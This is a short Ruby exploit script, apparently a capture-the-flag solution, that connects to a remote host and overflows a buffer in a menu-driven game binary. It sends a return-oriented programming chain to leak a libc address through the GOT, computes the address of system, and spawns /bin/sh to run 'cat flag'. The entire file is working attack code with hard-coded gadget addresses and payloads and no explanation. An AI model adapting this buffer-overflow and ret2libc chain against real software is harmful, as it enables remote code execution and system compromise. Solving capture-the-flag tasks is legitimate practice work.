require 'socket'
class Exploit
  def initialize
    @s = TCPSocket.new('52.1.91.215', 2114)
#    @s = TCPSocket.new('localhost', 8082)
    puts @s.read("enter any cheat if you know of it ;-) : ".length)
#    @s.write('a'*24 + [0x4017DF].pack('Q') + "\n")
    @s.write('a'*24 + [0x4017DF].pack('Q') + "\n")
    11.times { puts @s.readline }
    @s.write("1\n")
    puts @s.readline
    @s.write("1\n")
    puts @s.readline
    @s.write("1\n")
    puts @s.readline
    puts @s.readline

    puts "======================="
    @s.write("2\n")
    puts @s.readline

    2.times  do
      @s.write("1\n")
      puts @s.readline
    end

    @s.write("5\n")
    puts @s.readline
    puts @s.read('CONGRAZZ A new HI SCORE! What is your name? '.length)

    # read : /bin/sh copy
    # puts __libc
    # jmp system with /bin/sh
    @buf = 0x605730
    @read_got = 0x605078
    @pop_gadget = 0x402FBA
    @call_gadget = 0x0402FA0
    @pop_rdi_ret = 0x402FC3
    @puts = 0x400CD0 
    @libc_got = 0x605080
    @vuln = 0x4017DF 
    readline

    payload = [@pop_gadget, 0, 1, @read_got, 0x1000, @buf, 0, @call_gadget]
    payload += [0] * 7 + [@pop_rdi_ret, @libc_got, @puts, @vuln]

    @s.write('a'*0x118 + payload.pack('Q*') + "\n")
    @s.write("/bin/sh\n")

    17.times { puts @s.readline }
    @libc_base = @s.readline[0..-2].ljust(8, "\x00").unpack('Q')[0] - 0x0021DD0
    puts "- Libc : 0x%08x" % @libc_base
    @system = @libc_base + 0x46640

    @s.write('a'*0x118 + [@pop_rdi_ret, @buf, @system].pack('Q*') + "\n") 
    @s.write("cat flag\n")

    loop { print @s.read(1) }
  end
end

s = Exploit.new
